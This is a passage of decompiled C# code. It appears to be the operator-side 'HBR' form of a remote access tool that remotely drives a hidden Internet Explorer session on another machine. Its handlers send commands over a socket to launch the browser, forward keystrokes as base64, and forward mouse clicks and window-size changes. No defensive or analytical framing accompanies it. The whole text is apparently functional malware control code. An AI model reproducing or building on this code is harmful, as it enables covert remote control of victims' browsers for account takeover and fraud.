			P2.Enabled = false;
			P3.Enabled = false;
			sk.Send("Get" + Class7.string_1 + "Internet Explorer");
			Istart.Text = "Browser Start...";
			Istart.Enabled = false;
		}
	}

	public void HBR_Load(object sender, EventArgs e)
	{
		sk.Send("bro" + Class7.string_1);
	}

	public void HBR_Resize(object sender, EventArgs e)
	{
		try
		{
			int num = BrowserBox.Width;
			int num2 = BrowserBox.Height;
			sk.Send("Siz" + Class7.string_1 + Conversions.ToString(num) + Class7.string_1 + Conversions.ToString(num2));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_5(object sender, EventArgs e)
	{
		try
		{
			sk.Send("Stop" + Class7.string_1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (sk != null)
		{
			sk.CN = false;
		}
	}

	public void method_6(object sender, KeyPressEventArgs e)
	{
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(Conversions.ToString(e.KeyChar)));
		sk.Send("ky" + Class7.string_1 + text);
	}

	public void method_7(object sender, PaintEventArgs e)
	{
		string s = Conversions.ToString(Label7.Text.Replace("KB", "SB"));
		Size size = TextRenderer.MeasureText(s, new Font(Font, FontStyle.Bold));
		if (!((point_0.X < size.Width) & (point_0.Y < size.Height)))
		{
			Rectangle rect = new Rectangle(0, 0, size.Width, size.Height);
			e.Graphics.FillRectangle(new Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rect);
			Brush brush = Brushes.YellowGreen;
			if (Label7.Text.Length > 15)
			{
				brush = Brushes.YellowGreen;
			}
			if (Label7.Text.Length > 50)
			{
				brush = Brushes.LimeGreen;
			}
			e.Graphics.DrawString(s, new Font(Font, FontStyle.Bold), brush, 0f, 0f);
		}
	}

	public void method_8(object sender, MouseEventArgs e)
	{
		Point location = e.Location;
		object objectValue = RuntimeHelpers.GetObjectValue(BrowserBox.Tag);
		try
		{
			Size obj;
			if (objectValue != null)
			{
				obj = ((objectValue != null) ? ((Size)objectValue) : default(Size));
			}
			else
			{
				obj = default(Size);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox("e1");
			ProjectData.ClearProjectError();
		}
		try
		{
			int value = Convert.ToInt32(decimal.Divide(new decimal(BrowserBox.Width), new decimal(base.Size.Width)));
			int value2 = Convert.ToInt32(decimal.Divide(new decimal(BrowserBox.Height), new decimal(base.Size.Height)));
			int num = Convert.ToInt32(Math.Ceiling(decimal.Divide(new decimal(location.X), new decimal(value))));
			int num2 = Convert.ToInt32(Math.Ceiling(decimal.Divide(new decimal(location.Y), new decimal(value2))));
			if (e.Button == MouseButtons.Left)
			{
				sk.Send("ml" + Class7.string_1 + Conversions.ToString(num) + Class7.string_1 + Conversions.ToString(num2));
			}
			if (e.Button == MouseButtons.Right)
			{
				sk.Send("mr" + Class7.string_1 + Conversions.ToString(num) + Class7.string_1 + Conversions.ToString(num2));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			Interaction.MsgBox("sss");
			ProjectData.ClearProjectError();
		}
	}

	public void method_9(object sender, EventArgs e)
	{
		sk.Send("Stop" + Class7.string_1);
	}

	public void method_10(object sender, EventArgs e)
	{
	}

	public void method_11(object sender, EventArgs e)
	{
		Hide();
	}

	public void method_12(object sender, EventArgs e)
	{
		if (!sk.CN)
		{
			sk.CN = false;
			Close();
		}
	}
}
